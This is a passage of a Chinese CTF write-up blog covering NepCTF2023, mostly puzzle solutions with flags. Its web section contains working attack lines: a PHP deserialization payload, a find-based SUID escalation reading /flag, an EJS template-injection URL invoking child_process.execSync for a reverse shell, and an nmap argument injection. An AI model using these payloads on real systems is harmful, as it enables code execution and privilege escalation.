class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;qwb&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;myclass&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;&#125;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Hello&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;qwb&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;&#125;</code></pre></div><p>myclass作为了<code>__PHP_Incomplete_Class</code>中属性，会触发<code>__autoload</code>引入<code>myclass.php</code>，而对他进行二次序列化时，因为<code>__PHP_Incomplete_Class</code>没有<code>__PHP_Incomplete_Class_Name</code>该对象会消失，从而绕过<code>preg_match</code>的检测，并在最后触发<code>Hello</code>类的反序列化。</p><p>网上的图</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904134136323.png" alt="image-20230904134136323"></p><h4 id="这道题也能fast-destruct"><a href="#这道题也能fast-destruct" class="headerlink" title="这道题也能fast destruct"></a>这道题也能fast destruct</h4><p>这里</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NepCTF2023</title>
    <link href="/2023/08/31/NepCTF2023/"/>
    <url>/2023/08/31/NepCTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="Nepctf2023-复现"><a href="#Nepctf2023-复现" class="headerlink" title="Nepctf2023(复现)"></a>Nepctf2023(复现)</h1><p><strong>比赛战队名：shimmer</strong></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">NepCTF</span><span class="hljs-template-variable">&#123;H4ve_Fun_1N_This_Game&#125;</span><br></code></pre></td></tr></table></figure><h3 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h3><p>利用AI写出对应的解压函数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decompress</span>(<span class="hljs-params">input_file, output_file</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-comment"># Read frequency information</span><br><br>        num_symbols = <span class="hljs-built_in">int</span>.from_bytes(f.read(<span class="hljs-number">1</span>), byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br>        frequencies = &#123;&#125;<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_symbols):<br>            byte = <span class="hljs-built_in">int</span>.from_bytes(f.read(<span class="hljs-number">1</span>), byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br>            freq = <span class="hljs-built_in">int</span>.from_bytes(f.read(<span class="hljs-number">4</span>), byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br>            frequencies[byte] = freq<br><br>        <span class="hljs-comment"># Build Huffman tree</span><br><br>        root = build_huffman_tree(frequencies)<br><br>        <span class="hljs-comment"># Read compressed data</span><br><br>        compressed_data = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            byte = f.read(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> byte:<br>                <span class="hljs-keyword">break</span><br><br>            compressed_data += <span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(byte), <span class="hljs-string">&#x27;08b&#x27;</span>)<br><br>    current_node = root<br><br>    decompressed_data = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> compressed_data:<br>        <span class="hljs-keyword">if</span> bit == <span class="hljs-string">&#x27;0&#x27;</span>:<br>            current_node = current_node.left<br><br>        <span class="hljs-keyword">else</span>:<br>            current_node = current_node.right<br><br>        <span class="hljs-keyword">if</span> current_node.char <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            decompressed_data += <span class="hljs-built_in">chr</span>(current_node.char)<br>            current_node = root<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(decompressed_data)<br></code></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">Nepctf</span><span class="hljs-template-variable">&#123;huffman_zip_666&#125;</span><br></code></pre></td></tr></table></figure><h3 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h3><p>题目要求读取环境变量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv,<span class="hljs-type">char</span> **envp)</span></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the 1st envp is : %s\n&quot;</span>,envp[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>env被列入黑名单，修改为其他变量名即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//最终payload</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv,<span class="hljs-type">char</span> **enp)</span></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the 1st envp is : %s\n&quot;</span>,enp[<span class="hljs-number">12</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Nepctf</span>&#123;easy_codes_49260e9f-bcb8-<span class="hljs-number">4</span>bb3-<span class="hljs-number">9</span>a8f-<span class="hljs-number">7</span>c0418978cda_[TEAM_HASH]&#125;<br></code></pre></td></tr></table></figure><h3 id="小叮弹钢琴"><a href="#小叮弹钢琴" class="headerlink" title="小叮弹钢琴"></a>小叮弹钢琴</h3><p>使用audacity打开</p><p>前半段为摩斯密码，长的为<code>-</code>，短的为<code>.</code>，中间空的为空格</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">youshouldusethistoxorsomething</span><br></code></pre></td></tr></table></figure><p>后半段侧过来看是一串16进制</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0</span>x370a05303c290e045005031c2b1858473a5f052117032c39230f<span class="hljs-number">005d1e17</span><br></code></pre></td></tr></table></figure><p>根据提示把他俩异或</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">b= <span class="hljs-string">&#x27;youshouldusethistoxorsomething&#x27;</span><br><span class="hljs-selector-tag">a</span> = <span class="hljs-selector-attr">[0x37,0x0a,0x05,0x30,0x3c,0x29,0x0e,0x04,0x50,0x05,0x03,0x1c,0x2b,0x18,0x58,0x47,0x3a,0x5f,0x05,0x21,0x17,0x03,0x2c,0x39,0x23,0x0f,0x00,0x5d,0x1e,0x17]</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    e += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-selector-tag">b</span><span class="hljs-selector-attr">[i]</span>)^<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[i]</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(e)</span></span><br></code></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">NepCTF</span><span class="hljs-template-variable">&#123;h4ppy_p14N0&#125;</span><span class="language-xml">NepCTF</span><span class="hljs-template-variable">&#123;h4pp</span><br></code></pre></td></tr></table></figure><h3 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h3><p><img src="/2023/08/31/NepCTF2023/%E9%99%8C%E7%94%9F%E7%9A%84%E7%BA%B8%E6%9D%A1.jpg" alt="题目"></p><p>根据提示Atsuko Kagari，找到小魔女学院，搜索<code>小魔女学院文字</code>发现<code>新月文字</code></p><p>然后继续找到<code>古龙语</code></p><p><img src="/2023/08/31/NepCTF2023/fb569e24b899a9014e4b15075b950a7b0208f568.jpg" alt="img"></p><p><img src="/2023/08/31/NepCTF2023/image-20230817081407279.png" alt="image-20230817081407279"></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">NepCTF&#123;NEPNEP_<span class="hljs-built_in">A_BELIEVING</span>_HEART_IS_YOUR_MAGIC&#125;<br></code></pre></td></tr></table></figure><h3 id="你也喜欢三月七吗"><a href="#你也喜欢三月七吗" class="headerlink" title="你也喜欢三月七吗"></a>你也喜欢三月七吗</h3><p>题目</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！<br><br>需要经过啥256处理一下<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">salt_lenth</span>= <span class="hljs-number">10</span> <br><span class="hljs-attr">key_lenth</span>= <span class="hljs-number">16</span> <br><span class="hljs-attr">iv</span>= <span class="hljs-number">88219</span>bdee9c396eca3c637c0ea436058 <span class="hljs-comment">#原始iv转hex的值</span><br><span class="hljs-attr">ciphertext</span>= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc<br><br></code></pre></td></tr></table></figure><p>解析题目：群名、咸（salt）、sha256</p><p>Key为salt（群名）用sha256加密的前16位</p><p>看代码发现<code>iv和key</code>猜测是AES256</p><p><img src="/2023/08/31/NepCTF2023/image-20230817083833353.png" alt="image-20230817083833353"></p><p>用cyberchef<code>Mode</code>要调为<code>NoPadding</code></p><p>得到一张图片</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//img</span>1.imgtp.com<span class="hljs-regexp">/2023/</span><span class="hljs-number">07</span><span class="hljs-regexp">/24/y</span>OkXWSJT.png<br></code></pre></td></tr></table></figure><p><img src="/2023/08/31/NepCTF2023/%E4%BD%A0%E7%8E%A9%E8%BF%87%E6%98%9F%E7%A9%B9%E9%93%81%E9%81%93%E5%90%97.png" alt="图片"></p><p>搜索<code>星穹铁道文字</code>       （<code>I</code>不容易看出是大写）</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">NepCTF</span><span class="hljs-template-variable">&#123;HRP_aIways_likes_March_7th&#125;</span><br></code></pre></td></tr></table></figure><h3 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h3><p>看别人都说玩完就行，但还是搞不懂</p><h3 id="EZII-BASIC"><a href="#EZII-BASIC" class="headerlink" title="EZII BASIC"></a>EZII BASIC</h3><p>题目关键词：1977年 世界上第一批大规模生产的个人电脑   BASIC语言</p><p><img src="/2023/08/31/NepCTF2023/image-20230819031956318.png" alt="image-20230819031956318"></p><p><img src="/2023/08/31/NepCTF2023/image-20230819032307820.png" alt="image-20230819032307820"></p><p><img src="/2023/08/31/NepCTF2023/image-20230819032325509.png" alt="image-20230819032325509"></p><p><img src="/2023/08/31/NepCTF2023/image-20230819032355056.png" alt="image-20230819032355056"></p><p>可以看到第十行是<code>END</code></p><p>运行时把第十行修改一下</p><p><img src="/2023/08/31/NepCTF2023/image-20230819032446411.png" alt="image-20230819032446411"></p><p>然后<code>RUN</code></p><p><img src="/2023/08/31/NepCTF2023/image-20230819032625921.png" alt="image-20230819032625921"></p><p>这里复现就不比对了</p><h2 id="WEB（参考Boogipop的博客和官方WP）"><a href="#WEB（参考Boogipop的博客和官方WP）" class="headerlink" title="WEB（参考Boogipop的博客和官方WP）"></a>WEB（参考Boogipop的博客和官方WP）</h2><p>（没环境复现，都是大佬的图，给的题目附件不会用）</p><h3 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h3><p>经典的shrio rememberMe反序列化</p><p>利用CC2的链去打</p><p>这里用工具一把梭</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#算是非预期</span><br>cat /start.sh<br><br><span class="hljs-comment">#/bin/bash</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">GZCTF_FLAG</span>=NepcTF&#123;Ezjava_Chekin&#125;<br>echo <span class="hljs-variable">$GZCTF_FLAG</span> &gt; /flag<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">GZCTF_FLAG</span>=<span class="hljs-string">&quot;HAHA,NO FLAG but boom.&quot;</span><br>su ctf -c <span class="hljs-string">&quot;bash -c &#x27;java -jar /ShiroSpring-0.0.1-SNAPSHOT.jar&#x27;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#预期</span><br><span class="hljs-built_in">ls</span> /usr/bin -l|grep rws    <span class="hljs-comment">##查找可suid提权</span><br><br>find suid 提权<br><span class="hljs-built_in">touch</span> /tmp/evil&amp;find /tmp/evil -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> /flag \;<br></code></pre></td></tr></table></figure><h3 id="Post-Crad-For-You"><a href="#Post-Crad-For-You" class="headerlink" title="Post Crad For You"></a>Post Crad For You</h3><p>两篇文章了解ejs模板注入</p><p><a href="https://xz.aliyun.com/t/12323#toc-1">Ejs模板引擎注入实现RCE - 先知社区 (aliyun.com)</a></p><p><a href="https://inhann.top/2023/03/26/ejs/">https://inhann.top/2023/03/26/ejs/</a></p><p>题目代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;crypto&quot;</span>);<br><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()<br><span class="hljs-keyword">const</span> port = <span class="hljs-number">3000</span><br><br>templateDir = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;template&#x27;</span>);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;template&#x27;</span>, templateDir);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">milliSeconds</span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">StartTime</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>();<br>    <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>() &lt;<span class="hljs-title class_">StartTime</span>+milliSeconds);<br><br>&#125;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">sendFile</span>(<span class="hljs-string">&#x27;./index.html&#x27;</span>, &#123;<span class="hljs-attr">root</span>: __dirname&#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/create&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> uuid;<br>    <span class="hljs-keyword">let</span> name = req.<span class="hljs-property">query</span>.<span class="hljs-property">name</span> ?? <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">let</span> address = req.<span class="hljs-property">query</span>.<span class="hljs-property">address</span> ?? <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">let</span> message = req.<span class="hljs-property">query</span>.<span class="hljs-property">message</span> ?? <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        uuid = crypto.<span class="hljs-title function_">randomUUID</span>();<br>    &#125; <span class="hljs-keyword">while</span> (fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;uuid&#125;</span>.ejs`</span>))<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (name != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; address != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; message != <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>            <span class="hljs-keyword">let</span> source = [<span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;source1&quot;</span>, <span class="hljs-string">&quot;source2&quot;</span>, <span class="hljs-string">&quot;source3&quot;</span>].<span class="hljs-title function_">sort</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> - <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();<br>            &#125;)<br>            fs.<span class="hljs-title function_">readFile</span>(source[<span class="hljs-number">0</span>]+<span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">err, pageContent</span>)&#123;<br>                fs.<span class="hljs-title function_">writeFileSync</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;uuid&#125;</span>.ejs`</span>, pageContent.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/--ID--/g</span>, uuid.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/-/g</span>, <span class="hljs-string">&quot;&quot;</span>)));<br>                <span class="hljs-title function_">sleep</span>(<span class="hljs-number">2000</span>);<br>            &#125;)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Params `name` or `address` or `message` empty&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span>(err) &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Failed to write file&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">`/page?pageid=<span class="hljs-subst">$&#123;uuid&#125;</span>&amp;name=<span class="hljs-subst">$&#123;name&#125;</span>&amp;address=<span class="hljs-subst">$&#123;address&#125;</span>&amp;message=<span class="hljs-subst">$&#123;message&#125;</span>`</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/page&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req,res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">query</span>.<span class="hljs-property">pageid</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="hljs-title function_">test</span>(id) || !fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;id&#125;</span>.ejs`</span>)) &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Sorry, no such id&quot;</span>)<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;id&#125;</span>.ejs`</span>, req.<span class="hljs-property">query</span>);<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`App listening on port <span class="hljs-subst">$&#123;port&#125;</span>`</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>关键代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/page&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req,res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">query</span>.<span class="hljs-property">pageid</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="hljs-title function_">test</span>(id) || !fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;id&#125;</span>.ejs`</span>)) &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Sorry, no such id&quot;</span>)<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;id&#125;</span>.ejs`</span>, req.<span class="hljs-property">query</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><p><code>req.query</code>放入<code>render</code>存在ejs模板注入</p><p>正常ejs模板注入是利用<code>opts.outputFunctionName 、opts.localsName 、opts.destructuredLocals</code> </p><p>而<code>cve2022的Bypass</code>是因为他们无法通过正则，于是找到<code>opts.escapeFunction</code>，使用<code>opts.escapeFunction</code>要保证<code>opts.client</code>不为空</p><p>此处使用cve2022的bypass （由于没有题目环境，无法确认，但应该是要绕过正则的）</p><p><code>payload</code>如下</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-keyword">page</span>?pageid=符合格式的id<span class="hljs-variable">&amp;name</span>=1<span class="hljs-variable">&amp;address</span>=1<span class="hljs-variable">&amp;message</span>=asdasd<span class="hljs-variable">&amp;settings</span>[<span class="hljs-keyword">view</span> <span class="hljs-keyword">options</span>][escapeFunction]=console.log;this.global.process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;反弹shell&#x27;</span>);<span class="hljs-variable">&amp;settings</span>[<span class="hljs-keyword">view</span> <span class="hljs-keyword">options</span>][client]=true<br></code></pre></td></tr></table></figure><h3 id="独步天下-转生成为镜花水月中的王者"><a href="#独步天下-转生成为镜花水月中的王者" class="headerlink" title="独步天下-转生成为镜花水月中的王者"></a>独步天下-转生成为镜花水月中的王者</h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>大佬把nmap给dump下来分析</p><p><img src="/2023/08/31/NepCTF2023/image.png"></p><p>root权限命令执行</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">payload:</span> nmap <span class="hljs-string">&quot;asd;sh&quot;</span><br></code></pre></td></tr></table></figure><h4 id="法二"><a href="#法二" class="headerlink" 